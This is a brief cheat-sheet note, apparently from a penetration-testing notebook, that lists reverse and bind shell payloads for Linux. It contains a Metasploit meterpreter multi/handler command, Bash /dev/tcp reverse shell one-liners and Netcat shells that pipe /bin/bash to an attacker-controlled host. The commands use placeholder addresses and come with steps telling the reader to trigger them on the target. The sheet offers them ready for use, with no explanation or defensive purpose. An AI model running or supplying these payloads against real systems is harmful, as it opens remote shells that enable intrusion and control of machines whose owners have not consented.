---
title: Reverse Shells
type: note
tab: Payloads
tools: [bash, metasploit]
inputs: []
outputs: [Shell]
tags: [Payloads, Linux]
---

# Reverse Shells

## Metasploit Handler

#Payloads
Start a quiet Metasploit multi/handler for a Linux x64 meterpreter reverse TCP payload.

```sh
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; exploit -j"
```

## Bash Reverse Shell

#Linux #Payloads
Basic Bash TCP reverse shell one-liner.

```sh
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Netcat Shells

### Reverse Shell

#Linux #Payloads
Catch a reverse shell from a target that has Netcat with `-e` support.

1. Start the listener on the attacker box.

```sh
nc -lvnp <LPORT>
```

2. Trigger the reverse shell on the target.

```sh
nc <LHOST> <LPORT> -e /bin/bash
```

### Blind Shell

#Linux #Payloads
Expose `/bin/bash` over Netcat on the target, then connect to it from the attacker box.

1. Start the bind shell on the target.

```sh
nc -lvnp <LPORT> -e /bin/bash
```

2. Connect from the attacker box.

```sh
nc <TARGET_IP> <LPORT>
```

### Bash TCP Fallback

#Shell #Linux #Payloads
Use Bash `/dev/tcp` when Netcat does not support `-e`.

1. Start the listener on the attacker box.

```sh
nc -lvnp <LPORT>
```

2. Trigger the Bash reverse shell on the target.

```sh
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

## Notes

- Keep a listener or handler ready before triggering the payload.
- Replace placeholder host and port values before use.
